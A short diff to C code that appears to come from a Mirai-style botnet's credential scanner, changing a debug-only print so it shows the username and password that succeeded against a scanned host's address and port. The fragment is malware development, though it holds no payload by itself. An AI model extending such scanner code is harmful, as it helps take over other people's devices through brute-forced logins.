@@ -644,7 +644,11 @@ void scanner_init(void)
 #endif
                                 report_working(conn->dst_addr, conn->dst_port, conn->auth);
 #ifdef DEBUG
-                                printf("[scanner] FD%d addr: %d.%d.%d.%d, port: %d, auth: %x\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff, conn->dst_port, conn->auth);
+                                printf("[scanner] FD%d addr: %d.%d.%d.%d, port: %d, auth: %s:%s (%d:%d)\n", conn->fd, 
+                                        conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff, 
+                                        conn->dst_port, 
+                                        conn->auth->username, conn->auth->password,
+                                        conn->auth->username_len, conn->auth->password_len);
 #endif
                                 close(conn->fd);
                                 conn->fd = -1;
